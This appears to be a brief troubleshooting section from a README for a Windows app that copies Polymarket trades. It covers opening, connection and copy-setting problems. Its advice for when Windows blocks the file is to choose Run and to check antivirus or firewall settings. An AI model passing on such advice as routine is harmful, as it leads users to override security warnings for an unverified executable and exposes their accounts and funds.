## 🧰 Basic troubleshooting

### The app will not open
- Make sure the file finished downloading
- Try opening it again
- Restart your PC and try once more

### Windows blocks the file
- Open the file from the download page only
- Choose Run if Windows asks for permission
- Check your antivirus or firewall settings

### The app cannot connect
- Check your internet connection
- Make sure your Polymarket details are correct
- Log out and sign in again if the app offers that option

### Trades do not copy
- Check your copy settings
- Make sure limits are not too strict
- Confirm that the source market is active
